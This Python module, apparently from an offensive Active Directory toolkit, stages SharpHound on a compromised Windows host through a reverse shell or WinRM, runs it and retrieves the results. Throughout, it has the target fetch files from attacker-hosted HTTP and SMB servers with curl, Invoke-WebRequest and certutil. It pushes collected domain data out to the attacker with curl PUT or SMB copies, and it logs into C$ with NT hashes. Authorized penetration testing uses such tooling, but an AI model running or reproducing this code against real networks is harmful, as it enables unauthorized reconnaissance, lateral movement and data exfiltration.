"""Run bundled SharpHound on a target (shell or WinRM) and import results."""

from __future__ import annotations

import json
import io
import os
import re
import base64
import zipfile
from pathlib import Path
from typing import TYPE_CHECKING, Any

from admapper.dashboard.bloodhound_overlay import build_and_save_overlay
from admapper.sharphound.acl_bridge import refresh_sharphound_intel, sync_pivot_from_shell
from admapper.support.output import print_info, print_success, print_warning

if TYPE_CHECKING:
    from admapper.dashboard.shell_bridge import DashboardShellSession
    from admapper.postex.listener import ReverseShellListener
    from admapper.support.session import Session
    from admapper.winrm.client import WinRMClient

from admapper.sharphound.toolkit import (
    REMOTE_TOOLKIT_BASE as _REMOTE_BASE,
    REMOTE_TOOLKIT_OUT as _REMOTE_OUT,
    load_deploy_toolkit_meta,
)

_REMOTE_EXE = rf"{_REMOTE_BASE}\SharpHound.exe"
_STAGED_CURL = rf"{_REMOTE_BASE}\curl.exe"
_REMOTE_ZIP = rf"{_REMOTE_OUT}\admapper_sh.zip"
_SH_ZIP_BASENAME = "admapper_sh.zip"
_COLLECTION = (
    "DcOnly,ACL,Group,Session,Container,ObjectProps,CertServices,DCOM,PSRemote,SPNTargets"
)
_DEFAULT_HTTP_PORT = 8765

def _extract_b64_line(output: str) -> str:
    """Return the longest base64-only line from shell output."""
    best = ""
    for line in output.splitlines():
        candidate = line.strip()
        if len(candidate) > len(best) and re.fullmatch(r"[A-Za-z0-9+/=]+", candidate):
            best = candidate
    if not best:
        raise RuntimeError(f"no base64 payload in shell output:\n{output[:400]}")
    return best


def _remote_file_bytes(shell: DashboardShellSession, remote_win_path: str) -> int | None:
    out = shell.run_command(
        f'for %I in ("{remote_win_path}") do @echo %~zI',
        timeout=30.0,
    )
    matches = [int(n) for n in re.findall(r"\b(\d+)\b", out) if int(n) > 0]
    if not matches:
        return None
    return matches[-1]


def _verify_remote_file(
    shell: DashboardShellSession,
    remote_win_path: str,
    expected_size: int,
) -> bool:
    size = _remote_file_bytes(shell, remote_win_path)
    ok = size == expected_size
    return ok


def _copy_output_ok(output: str) -> bool:
    lower = output.lower()
    if "0 file" in lower:
        return False
    if "cannot find" in lower or "network path" in lower:
        return False
    if "denied" in lower or "failed" in lower:
        return False
    return "1 file" in lower or "copied" in lower


def _ps_encoded(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


def _run_powershell(shell: DashboardShellSession, script: str, *, timeout: float) -> str:
    encoded = _ps_encoded(script)
    if len(encoded) > 7800:
        raise ValueError("powershell script too large for -EncodedCommand")
    return shell.run_command(f"powershell -NoProfile -EncodedCommand {encoded}", timeout=timeout)


def _start_smb_share(
    share_dir: Path,
    *,
    read_only: bool = True,
    ports: tuple[int, ...] = (445, 8445, 4445),
) -> tuple[Any, int, Any]:
    """Bind an impacket SMB share; try fallback ports when 445 is taken or needs root."""
    from impacket.smbserver import SimpleSMBServer
    from threading import Thread

    share_dir.mkdir(parents=True, exist_ok=True)
    last_err: Exception | None = None
    for port in ports:
        try:
            server = SimpleSMBServer(listenAddress="0.0.0.0", listenPort=port)
            server.setSMB2Support(True)
            server.addShare(
                "admapper",
                str(share_dir.resolve()),
                readOnly="yes" if read_only else "no",
            )
            thread = Thread(target=server.start, daemon=True, name=f"smb-share-{port}")
            thread.start()
            return server, port, thread
        except OSError as exc:
            last_err = exc
            continue
    raise OSError(f"could not bind SMB share on ports {ports}") from last_err


def _stop_smb_share(server: Any, thread: Any) -> None:
    try:
        server.stop()
    except Exception:
        pass
    if thread is not None:
        thread.join(timeout=2.0)


def _smb_unc_copy_cmd(lhost: str, remote_name: str, dest: str, *, port: int) -> str:
    unc = f"\\\\{lhost}\\admapper\\{remote_name}"
    if port == 445:
        return f'copy /Y "{unc}" "{dest}"'
    return (
        f'net use \\\\{lhost}\\admapper /port:{port} & '
        f'copy /Y "{unc}" "{dest}"'
    )


def upload_file_via_smb_share(
    shell: DashboardShellSession,
    local_path: Path,
    remote_win_path: str,
    *,
    lhost: str,
) -> None:
    """Have the target pull a file from an attacker-hosted SMB share (fast, no creds)."""
    if not local_path.is_file():
        raise FileNotFoundError(local_path)
    server, port, thread = _start_smb_share(local_path.parent, read_only=True)
    try:
        cmd = _smb_unc_copy_cmd(lhost, local_path.name, remote_win_path, port=port)
        out = shell.run_command(cmd, timeout=180.0)
        if not _copy_output_ok(out):
            raise RuntimeError(f"copy failed or ambiguous:\n{out[:400]}")
        if not _verify_remote_file(shell, remote_win_path, local_path.stat().st_size):
            raise RuntimeError(f"file missing or wrong size after copy:\n{out[:400]}")
    finally:
        _stop_smb_share(server, thread)
    print_success(f"staged {local_path.name} → {remote_win_path} via SMB share ({lhost}:{port})")


def download_file_via_smb_share(
    shell: DashboardShellSession,
    remote_win_path: str,
    local_path: Path,
    *,
    lhost: str,
) -> Path:
    """Have the target push a file to an attacker-hosted writable SMB share."""
    local_path.parent.mkdir(parents=True, exist_ok=True)
    if local_path.exists():
        local_path.unlink()
    server, port, thread = _start_smb_share(local_path.parent, read_only=False)
    try:
        unc_dest = f"\\\\{lhost}\\admapper\\{local_path.name}"
        if port == 445:
            cmd = f'copy /Y "{remote_win_path}" "{unc_dest}"'
        else:
            cmd = (
                f'net use \\\\{lhost}\\admapper /port:{port} & '
                f'copy /Y "{remote_win_path}" "{unc_dest}"'
            )
        out = shell.run_command(cmd, timeout=300.0)
        if not local_path.is_file() or local_path.stat().st_size == 0:
            raise RuntimeError(f"SMB share push failed:\n{out[:400]}")
    finally:
        _stop_smb_share(server, thread)
    print_success(f"downloaded {local_path.name} via SMB share ({local_path.stat().st_size} bytes)")
    return local_path


def upload_file_via_shell(
    shell: DashboardShellSession,
    local_path: Path,
    remote_win_path: str,
    *,
    chunk_b64: int = 2800,
) -> None:
    """Upload a file through the reverse shell (chunked base64 + certutil decode)."""
    if not local_path.is_file():
        raise FileNotFoundError(local_path)
    remote_b64 = f"{remote_win_path}.b64"
    shell.run_command(
        f'del /f /q "{remote_b64}" 2>nul & del /f /q "{remote_win_path}" 2>nul',
        timeout=30.0,
    )
    encoded = base64.b64encode(local_path.read_bytes()).decode("ascii")
    total = len(encoded)
    sent = 0
    while sent < total:
        chunk = encoded[sent : sent + chunk_b64]
        script = f"[IO.File]::AppendAllText('{remote_b64}','{chunk}')"
        _run_powershell(shell, script, timeout=90.0)
        sent += len(chunk)
        pct = min(100, int(sent * 100 / total))
        if sent == len(chunk) or pct % 10 == 0:
            print_info(f"staging via shell: {pct}%")
    decode_out = shell.run_command(
        f'certutil -decode "{remote_b64}" "{remote_win_path}"',
        timeout=180.0,
    )
    if "completed" not in decode_out.lower():
        print_warning(f"certutil decode: {decode_out[:400]}")
    if not _verify_remote_file(shell, remote_win_path, local_path.stat().st_size):
        raise RuntimeError(f"shell staging verify failed (size mismatch)")
    print_success(f"staged {local_path.name} → {remote_win_path} via shell")


def download_file_via_shell(
    shell: DashboardShellSession,
    remote_win_path: str,
    local_path: Path,
) -> Path:
    """Download a remote file through the reverse shell (certutil b64 + chunked fetch)."""
    expected = _remote_file_bytes(shell, remote_win_path)
    if not expected or expected < 128:
        raise RuntimeError(
            f"remote file missing or too small ({expected} bytes): {remote_win_path}"
        )
    remote_b64 = f"{remote_win_path}.admapper.b64"
    shell.run_command(f'if exist "{remote_b64}" del /f /q "{remote_b64}"', timeout=20.0)
    enc_out = shell.run_command(
        f'certutil -encode "{remote_win_path}" "{remote_b64}"',
        timeout=300.0,
    )
    if "complete" not in enc_out.lower():
        print_warning(f"certutil encode: {enc_out[:400]}")
    b64_size = _remote_file_bytes(shell, remote_b64)
    if not b64_size or b64_size < 64:
        raise RuntimeError(f"certutil encode failed for {remote_win_path}:\n{enc_out[:400]}")

    chunks: list[str] = []
    offset = 0
    read_size = 32000
    while offset < b64_size:
        length = min(read_size, b64_size - offset)
        script = (
            f"$fs=[IO.File]::OpenRead('{remote_b64}');"
            f"$fs.Position={offset};"
            f"$buf=New-Object byte[] {length};"
            f"[void]$fs.Read($buf,0,{length});"
            f"$fs.Close();"
            f"[Text.Encoding]::ASCII.GetString($buf)"
        )
        out = _run_powershell(shell, script, timeout=180.0)
        chunk_data = re.sub(r"[^A-Za-z0-9+/=]", "", out)
        if chunk_data:
            chunks.append(chunk_data)
        offset += length
        pct = min(100, int(offset * 100 / b64_size))
        if offset >= b64_size or pct % 25 == 0:
            print_info(f"fetching via shell: {pct}%")

    payload = "".join(chunks)
    lines = [
        line.strip()
        for line in payload.splitlines()
        if line.strip() and not line.startswith("-----")
    ]
    data = base64.b64decode("".join(lines))
    if len(data) < 128:
        raise RuntimeError(f"shell download decoded only {len(data)} bytes")
    if len(data) != expected:
        print_warning(f"zip size {len(data)} bytes (remote {expected}) — continuing")
    local_path.parent.mkdir(parents=True, exist_ok=True)
    local_path.write_bytes(data)
    print_success(f"downloaded {local_path.name} via shell ({len(data)} bytes)")
    return local_path


def sharphound_bundle_exe() -> Path:
    root = Path(__file__).resolve().parent
    exe = root / "SharpHound.exe"
    if not exe.is_file():
        raise FileNotFoundError(f"SharpHound.exe not found at {exe}")
    return exe


def _pick_lhost(session: Session, explicit: str | None = None) -> str:
    if explicit and explicit.strip():
        return explicit.strip()
    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
    for name in ("cheatsheet_vars.json", "state.json"):
        path = ws_path / name
        if not path.is_file():
            continue
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            continue
        for key in ("LHOST", "ATTACKER_IP", "lhost"):
            val = str(data.get(key) or "").strip()
            if val:
                return val
    raise ValueError("set LHOST / ATTACKER_IP (VPN IP) for HTTP staging of SharpHound.exe")


def _ensure_remote_out_dir(shell: DashboardShellSession) -> None:
    """Create toolkit base + out dir before SharpHound writes (cmd if-not-exist is unreliable)."""
    ps = (
        f"powershell -NoProfile -Command "
        f"\"New-Item -ItemType Directory -Force -Path '{_REMOTE_BASE}','{_REMOTE_OUT}' | Out-Null\""
    )
    shell.run_command(ps, timeout=30.0)


def _normalize_remote_zip(shell: DashboardShellSession) -> str:
    """SharpHound prefixes a timestamp — copy to fixed admapper_sh.zip for download."""
    listing = shell.run_command(f'dir /b "{_REMOTE_OUT}\\*_admapper_sh.zip"', timeout=60.0)
    zip_name = _parse_zip_name(listing)
    if not zip_name:
        listing = shell.run_command(f'dir /b "{_REMOTE_OUT}\\*.zip"', timeout=60.0)
        zip_name = _parse_zip_name(listing)
    if not zip_name:
        raise RuntimeError(f"no SharpHound .zip in {_REMOTE_OUT} — dir output:\n{listing[:500]}")
    if zip_name.lower() != _SH_ZIP_BASENAME.lower():
        shell.run_command(
            f'copy /Y "{_REMOTE_OUT}\\{zip_name}" "{_REMOTE_ZIP}"',
            timeout=60.0,
        )
    return _SH_ZIP_BASENAME


def _parse_zip_name(dir_output: str) -> str | None:
    for line in dir_output.splitlines():
        match = re.search(r"([\w.-]+\.zip)\s*$", line.strip(), re.I)
        if match:
            return match.group(1)
    match = re.search(r"([\w.-]+\.zip)", dir_output, re.I)
    return match.group(1) if match else None


def import_sharphound_zip(
    ws_path: Path,
    zip_path: Path,
    *,
    domain: str | None = None,
    session: Session | None = None,
    pivot_user: str | None = None,
    shell: DashboardShellSession | None = None,
) -> Path | None:
    """Extract BloodHound JSON from a SharpHound .zip into ``bloodhound/`` and rebuild overlay."""
    bh_dir = ws_path / "bloodhound"
    bh_dir.mkdir(parents=True, exist_ok=True)
    imported = 0
    with zipfile.ZipFile(zip_path, "r") as archive:
        for name in archive.namelist():
            lower = name.lower()
            if lower.endswith(".zip"):
                nested = zipfile.ZipFile(io.BytesIO(archive.read(name)), "r")
                for nested_name in nested.namelist():
                    if not nested_name.lower().endswith(".json"):
                        continue
                    base = Path(nested_name).name
                    if base == "collection_manifest.json":
                        continue
                    target = bh_dir / f"sh_{base}"
                    target.write_bytes(nested.read(nested_name))
                    imported += 1
                continue
            if not lower.endswith(".json"):
                continue
            base = Path(name).name
            if base in {"collection_manifest.json"}:
                continue
            target = bh_dir / f"sh_{base}"
            target.write_bytes(archive.read(name))
            imported += 1
    if not imported:
        raise RuntimeError(f"no BloodHound JSON in {zip_path.name}")
    print_success(f"imported {imported} BloodHound JSON file(s) → {bh_dir}")
    local_zip = bh_dir / zip_path.name
    if not local_zip.exists():
        local_zip.write_bytes(zip_path.read_bytes())
    overlay_path = build_and_save_overlay(ws_path, domain=domain)
    if session is not None:
        pivot = pivot_user or sync_pivot_from_shell(session, shell)
        if pivot:
            from admapper.sharphound.acl_bridge import apply_pivot_state

            apply_pivot_state(session, pivot)
            refresh_sharphound_intel(session, pivot, quiet=True)
    return overlay_path


def fetch_remote_file_smb(
    session: Session,
    *,
    remote_win_path: str,
    local_name: str | None = None,
    cred_id: str | None = None,
) -> Path:
    """Download a file from C$ via SMB (uses machine/hash cred when shell user has no password)."""
    from admapper.creds.common import pick_dc_ip
    from admapper.postex.creds import resolve_winrm_cred

    if session.workspace is None:
        raise RuntimeError("no active workspace")
    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC IP in workspace")
    domain = session.workspace.domain or session.workspace.name
    cred = resolve_winrm_cred(session, cred_id=cred_id, host=dc_ip)
    if not cred.uses_nthash and not cred.password:
        raise ValueError("need hash or password cred for SMB download")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError as exc:
        raise RuntimeError("impacket required for SMB download") from exc

    rel = remote_win_path.replace("C:\\", "").replace("C:/", "").replace("\\", "/")
    ws_path = session.workspaces.path_for(session.workspace.name)
    out_dir = ws_path / "bloodhound"
    out_dir.mkdir(parents=True, exist_ok=True)
    fname = local_name or Path(remote_win_path).name
    local = out_dir / fname

    secret = cred.nthash if cred.uses_nthash else cred.password
    smb = SMBConnection(dc_ip, dc_ip, sess_port=445, timeout=60)
    smb.login(cred.username, secret, domain)
    with open(local, "wb") as handle:
        smb.getFile("C$", rel, handle.write)
    print_success(f"downloaded {fname} → {local}")
    return local


def upload_file_smb(
    session: Session,
    local_path: Path,
    remote_win_path: str,
    *,
    cred_id: str | None = None,
) -> None:
    """Upload a local file to C$ via SMB (machine/hash cred — no shell password needed)."""
    from admapper.creds.common import pick_dc_ip
    from admapper.postex.creds import resolve_winrm_cred

    if session.workspace is None:
        raise RuntimeError("no active workspace")
    if not local_path.is_file():
        raise FileNotFoundError(local_path)
    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC IP in workspace")
    domain = session.workspace.domain or session.workspace.name
    cred = resolve_winrm_cred(session, cred_id=cred_id, host=dc_ip)
    if not cred.uses_nthash and not cred.password:
        raise ValueError("need hash or password cred for SMB upload")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError as exc:
        raise RuntimeError("impacket required for SMB upload") from exc

    rel = remote_win_path.replace("C:\\", "").replace("C:/", "").replace("\\", "/")
    secret = cred.nthash if cred.uses_nthash else cred.password
    smb = SMBConnection(dc_ip, dc_ip, sess_port=445, timeout=120)
    smb.login(cred.username, secret, domain)
    with local_path.open("rb") as fh:
        smb.putFile("C$", rel, fh.read)
    data_len = local_path.stat().st_size
    print_success(f"uploaded {local_path.name} → {remote_win_path} via SMB ({data_len} bytes)")


def _start_http_stager(*, port: int) -> tuple[Any, Any, int]:
    """Bind on 0.0.0.0; try fallback ports if the default is taken."""
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    from threading import Thread

    last_err: Exception | None = None
    for candidate in (port, 8767, 18765, 9876):
        try:
            server = HTTPServer(("0.0.0.0", candidate), SimpleHTTPRequestHandler)
            thread = Thread(target=server.serve_forever, daemon=True)
            thread.start()
            return server, thread, candidate
        except OSError as exc:
            last_err = exc
            continue
    raise OSError(f"could not bind HTTP stager on ports tried from {port}") from last_err


def download_file_via_http_push(
    shell: DashboardShellSession,
    remote_win_path: str,
    local_path: Path,
    *,
    lhost: str,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> Path:
    """Pull a remote file via HTTP PUT (target curls -T to attacker listener)."""
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from threading import Thread

    expected = _remote_file_bytes(shell, remote_win_path)
    if not expected or expected < 128:
        raise RuntimeError(
            f"remote file missing or too small ({expected} bytes): {remote_win_path}"
        )
    local_path.parent.mkdir(parents=True, exist_ok=True)
    if local_path.exists():
        local_path.unlink()

    class UploadHandler(BaseHTTPRequestHandler):
        def log_message(self, format: str, *args: Any) -> None:
            pass

        def _store_upload(self) -> None:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length)
            local_path.write_bytes(data)
            self.send_response(200)
            self.end_headers()

        def do_PUT(self) -> None:
            if self.path.split("?", 1)[0] != "/upload":
                self.send_error(404)
                return
            self._store_upload()

        def do_POST(self) -> None:
            if self.path.split("?", 1)[0] != "/upload":
                self.send_error(404)
                return
            self._store_upload()

    last_err: Exception | None = None
    server: Any = None
    thread: Any = None
    bound_port = http_port
    for candidate in (http_port, 8767, 18765, 9876):
        try:
            server = HTTPServer(("0.0.0.0", candidate), UploadHandler)
            thread = Thread(target=server.serve_forever, daemon=True)
            thread.start()
            bound_port = candidate
            break
        except OSError as exc:
            last_err = exc
            continue
    if server is None or thread is None:
        raise OSError(f"could not bind HTTP upload server from {http_port}") from last_err

    url = f"http://{lhost}:{bound_port}/upload"
    out = ""
    try:
        curl = (
            f'if exist "{_STAGED_CURL}" ('
            f'"{_STAGED_CURL}" -f -X PUT -T "{remote_win_path}" "{url}"'
            f') else ('
            f'curl.exe -f -X PUT -T "{remote_win_path}" "{url}" '
            f'|| curl -f -X PUT -T "{remote_win_path}" "{url}"'
            f')'
        )
        out = shell.run_command(curl, timeout=300.0)
        size = local_path.stat().st_size if local_path.is_file() else 0
        if size < 128:
            import time as _time

            _time.sleep(0.5)
            size = local_path.stat().st_size if local_path.is_file() else 0
    finally:
        server.shutdown()
        thread.join(timeout=2.0)

    size = local_path.stat().st_size if local_path.is_file() else 0
    if size < 128:
        raise RuntimeError(f"HTTP push download failed ({size} bytes):\n{out[:600]}")
    if size != expected:
        print_warning(f"HTTP push size {size} (remote {expected}) — continuing")
    print_success(f"downloaded {local_path.name} via HTTP push ({size} bytes)")
    return local_path


def _run_sharphound_cmd(
    runner: Any,
    *,
    domain: str,
    dc_fqdn: str | None,
    timeout: float = 600.0,
) -> str:
    dc_arg = f' --domaincontroller "{dc_fqdn}"' if dc_fqdn else ""
    cmd = (
        f'"{_REMOTE_EXE}" -c {_COLLECTION} -d {domain}{dc_arg} '
        f'--zipfilename admapper_sh --outputdirectory "{_REMOTE_OUT}"'
    )
    return runner(cmd, timeout=timeout)


def upload_file_via_http(
    shell: DashboardShellSession,
    local_path: Path,
    remote_win_path: str,
    *,
    lhost: str,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> None:
    """Stage a file via local HTTP server; target curls/Invoke-WebRequest."""
    local_dir = local_path.parent.resolve()
    orig = Path.cwd()
    os.chdir(local_dir)
    server, thread, bound_port = _start_http_stager(port=http_port)
    url = f"http://{lhost}:{bound_port}/{local_path.name}"
    expected = local_path.stat().st_size
    try:
        fetch = (
            f'if exist "{_STAGED_CURL}" ('
            f'"{_STAGED_CURL}" -fsSL -o "{remote_win_path}" "{url}"'
            f') else ('
            f'curl.exe -fsSL -o "{remote_win_path}" "{url}" '
            f'|| powershell -NoProfile -Command "Invoke-WebRequest -Uri \'{url}\' '
            f'-OutFile \'{remote_win_path}\' -UseBasicParsing"'
            f')'
        )
        shell.run_command(fetch, timeout=max(120.0, expected // 5000 + 60))
        if not _verify_remote_file(shell, remote_win_path, expected):
            raise RuntimeError(f"HTTP staging verify failed for {remote_win_path}")
        print_success(f"staged {local_path.name} via HTTP ({expected} bytes)")
    finally:
        os.chdir(orig)
        server.shutdown()
        thread.join(timeout=2.0)


def collect_via_shell(
    session: Session,
    shell: DashboardShellSession,
    *,
    lhost: str | None = None,
    cred_id: str | None = None,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> Path:
    """Stage SharpHound via reverse shell, run on target, fetch zip."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")
    if not shell.session_connected:
        raise RuntimeError("reverse shell disconnected — re-attach before SharpHound collect")
    domain = session.workspace.domain or session.workspace.name
    ws_path = session.workspaces.path_for(session.workspace.name)
    from admapper.creds.common import resolve_dc_fqdn, pick_dc_ip

    dc_ip = pick_dc_ip(session) or ""
    dc_fqdn = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or None
    exe = sharphound_bundle_exe()

    lhost_s = _pick_lhost(session, lhost)
    expected_size = exe.stat().st_size
    stage_errors: list[str] = []
    staged = False

    deploy_toolkit = load_deploy_toolkit_meta(ws_path)
    if deploy_toolkit:
        print_info(
            "toolkit was uploaded via WinRM as "
            f"{deploy_toolkit['upload_user']} — "
            f"running SharpHound as shell user ({deploy_toolkit['execute_as']})"
        )

    stage_methods: list[tuple[str, Any]] = [
        (
            "http",
            lambda: upload_file_via_http(
                shell, exe, _REMOTE_EXE, lhost=lhost_s, http_port=http_port
            ),
        ),
        ("shell", lambda: upload_file_via_shell(shell, exe, _REMOTE_EXE)),
    ]

    with shell.command_batch():
        ping = shell.run_command("echo ADMAPPER_PING", timeout=15.0)
        if "ADMAPPER_PING" not in ping:
            raise RuntimeError(
                "reverse shell not responding — re-run Establish Reverse Shell, then retry SH Collect"
            )

        _ensure_remote_out_dir(shell)

        if _verify_remote_file(shell, _REMOTE_EXE, expected_size):
            staged = True
            print_info(f"SharpHound.exe already on target ({expected_size} bytes) — skipping staging")

        for label, stage_fn in stage_methods:
            if staged:
                break
            try:
                stage_fn()
                if _verify_remote_file(shell, _REMOTE_EXE, expected_size):
                    staged = True
                else:
                    msg = f"{label}: size verify failed after staging"
                    stage_errors.append(msg)
                    print_warning(f"{msg} — trying next method")
            except Exception as exc:  # noqa: BLE001
                msg = f"{label}: {exc}"
                stage_errors.append(msg[:300])
                print_warning(f"{msg[:200]} — trying next method")

        if not staged:
            raise RuntimeError(
                "SharpHound.exe not staged on target — all methods failed.\n"
                + "\n".join(stage_errors[-4:])
            )

        sh_out = _run_sharphound_cmd(shell.run_command, domain=domain, dc_fqdn=dc_fqdn, timeout=600.0)
        if sh_out:
            print_info(f"SharpHound output (tail):\n{sh_out[-600:]}")
        _normalize_remote_zip(shell)
        remote_zip = _REMOTE_ZIP

        out_dir = ws_path / "bloodhound"
        out_dir.mkdir(parents=True, exist_ok=True)
        local_target = out_dir / _SH_ZIP_BASENAME
        local_zip: Path | None = None
        try:
            local_zip = download_file_via_http_push(
                shell,
                remote_zip,
                local_target,
                lhost=lhost_s,
                http_port=http_port,
            )
        except Exception as exc:  # noqa: BLE001
            print_warning(f"HTTP push failed ({exc}) — fetching via shell")
            local_zip = download_file_via_shell(shell, remote_zip, local_target)

        if not local_zip.is_file() or local_zip.stat().st_size < 128:
            raise RuntimeError(f"downloaded zip empty or missing: {local_zip}")

    return (
        import_sharphound_zip(
            ws_path,
            local_zip,
            domain=domain,
            session=session,
            shell=shell,
        )
        or local_zip
    )


def collect_via_winrm(
    session: Session,
    *,
    cred_id: str | None = None,
    lhost: str | None = None,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> Path:
    """Upload and run SharpHound via WinRM (runs as the WinRM principal)."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")
    from admapper.creds.common import pick_dc_ip, resolve_dc_fqdn
    from admapper.postex.creds import resolve_winrm_cred
    from admapper.winrm.factory import winrm_client_for_cred
    from admapper.winrm.upload import upload_file

    domain = session.workspace.domain or session.workspace.name
    ws_path = session.workspaces.path_for(session.workspace.name)
    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC IP")
    cred = resolve_winrm_cred(session, cred_id=cred_id, host=dc_ip)
    client = winrm_client_for_cred(cred, session)
    lhost_s = _pick_lhost(session, lhost)
    exe = sharphound_bundle_exe()

    client.execute(f'if not exist "{_REMOTE_BASE}" mkdir "{_REMOTE_BASE}"', shell="cmd")
    client.execute(f'if not exist "{_REMOTE_OUT}" mkdir "{_REMOTE_OUT}"', shell="cmd")
    upload_file(client, exe, _REMOTE_EXE, http_fetch_host=lhost_s, http_port=http_port)
    dc_fqdn = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or None
    dc_arg = f' --domaincontroller "{dc_fqdn}"' if dc_fqdn else ""
    run_ps = (
        f'"{_REMOTE_EXE}" -c {_COLLECTION} -d {domain}{dc_arg} '
        f'--zipfilename admapper_sh --outputdirectory "{_REMOTE_OUT}"'
    )
    client.execute(run_ps, shell="cmd", timeout=600)
    listing = client.execute(f'dir /b "{_REMOTE_OUT}\\*.zip"', shell="cmd", timeout=60)
    body = (listing.stdout or "").strip()
    zip_name = _parse_zip_name(body)
    if not zip_name:
        raise RuntimeError(f"no SharpHound zip produced — listing:\n{body[:500]}")
    remote_zip = rf"{_REMOTE_OUT}\{zip_name}"
    local_zip = fetch_remote_file_smb(
        session, remote_win_path=remote_zip, local_name=zip_name, cred_id=cred_id
    )
    return (
        import_sharphound_zip(
            ws_path,
            local_zip,
            domain=domain,
            session=session,
            shell=None,
        )
        or local_zip
    )


def collect_sharphound(
    session: Session,
    *,
    via: str = "auto",
    shell: DashboardShellSession | None = None,
    cred_id: str | None = None,
    lhost: str | None = None,
) -> Path | None:
    """Collect AD data with bundled SharpHound and import into workspace bloodhound overlay."""
    mode = (via or "auto").strip().lower()
    if mode == "auto":
        mode = "shell" if shell is not None and shell.session_connected else "winrm"
    if mode == "shell":
        if shell is None or not shell.session_connected:
            raise RuntimeError("active dashboard shell required — attach reverse shell first")
        return collect_via_shell(session, shell, lhost=lhost, cred_id=cred_id)
    if mode == "winrm":
        return collect_via_winrm(session, cred_id=cred_id, lhost=lhost)
    raise ValueError(f"unknown collect via={via!r}")
